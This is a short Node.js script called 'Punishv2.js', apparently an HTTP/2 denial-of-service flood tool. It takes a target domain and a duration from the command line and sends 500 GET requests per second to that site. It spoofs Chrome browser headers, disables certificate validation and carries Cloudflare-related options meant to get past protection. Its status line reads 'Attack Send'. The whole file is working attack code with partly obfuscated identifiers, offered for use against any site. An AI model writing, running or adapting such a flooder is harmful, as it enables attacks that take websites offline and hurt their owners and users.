const http2 = require('http2'),
  tls = require('tls'),
  fs = require('fs')
process.argv.length != 4 &&
  (console.log('Usage: node Punishv2.js domain time'),
  console.log('example: node Punishv2.js google.com time'),
  process.exit())
const targetHost = process.argv[2],
  targetPort = 443,
  durationSeconds = process.argv[3],
  headers = {
    'X-Forwarded-Proto': 'https',
    'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    Accept:
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua':
      '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
  },
  requestOptions = {
    host: targetHost,
    ecdhCurve: 'prime256v1:X25519',
    ciphers: [
      'TLS_AES_128_GCM_SHA256',
      'TLS_AES_256_GCM_SHA384',
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_AES_128_CCM_SHA256',
      'TLS_AES_128_CCM_8_SHA256',
    ].join(':'),
    secureProtocol: [
      'TLSv1.2_method',
      'TLSv1.3_method',
      'SSL_OP_NO_SSLv3',
      'SSL_OP_NO_SSLv2',
      'TLS_OP_NO_TLSv1_1',
      'TLS_OP_NO_TLSv1_0',
    ],
    sigals: [
      'rsa_pss_rsae_sha256',
      'rsa_pss_rsae_sha384',
      'rsa_pss_rsae_sha512',
      'rsa_pkcs1_sha256',
      'rsa_pkcs1_sha384',
      'rsa_pkcs1_sha512',
    ],
    servername: targetHost,
    challengesToSolve: Infinity,
    resolveWithFullResponse: true,
    cloudflareTimeout: 5000,
    cloudflareMaxTimeout: 30000,
    maxRedirects: Infinity,
    followAllRedirects: true,
    decodeEmails: false,
    gzip: true,
    secure: true,
    rejectUnauthorized: false,
    ALPNProtocols: ['h2'],
  },
  client = http2.connect(
    'https://' + targetHost + ':' + targetPort,
    requestOptions
  )
let requestCount = 0
client.on('connect', () => {
  console.log('Connected to the target server.')
  const _0x2fe67d = () => {
    const _0x3f4eb4 = client.request({
      ':method': 'GET',
      ':path': '/',
      ...headers,
    })
    _0x3f4eb4.on('response', (_0x38100f, _0x29e3b8) => {
      requestCount++
      if (requestCount % 100 === 0) {
      }
    })
    _0x3f4eb4.on('end', () => {})
    _0x3f4eb4.end()
  }
  console.log('Attack Send [Punishv2]')
  const _0x2d956d = setInterval(() => {
    for (let _0x5ea9a5 = 0; _0x5ea9a5 < 500; _0x5ea9a5++) {
      _0x2fe67d()
    }
  }, 1000)
  setTimeout(() => {
    clearInterval(_0x2d956d)
    client.close()
  }, durationSeconds * 1000)
})
client.on('error', (_0x492603) => {
  console.error('Client error: ' + _0x492603.message)
})
